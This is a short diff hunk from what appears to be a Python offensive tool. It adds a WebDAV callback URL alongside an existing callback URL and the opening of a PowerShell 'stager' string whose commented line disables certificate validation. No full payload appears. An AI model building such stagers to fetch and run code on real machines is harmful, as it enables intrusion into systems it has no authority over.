@@ -82,6 +82,11 @@ callback_url = '%s://%s:%d/%s' % (
     args.URI_PATH+'/' if args.URI_PATH else '',
 )
 
+webdav_url = '%s://%s:%d/webdav' % (
+    args.PROTOCOL,
+    args.URI_HOST,
+    args.WEBDAV_PORT,
+)
 
 stager_str = (
     #  "[System.Net.ServicePointManager]::ServerCertificateValidationCallback #  = {$true};" if args.SSL else "" # noqa
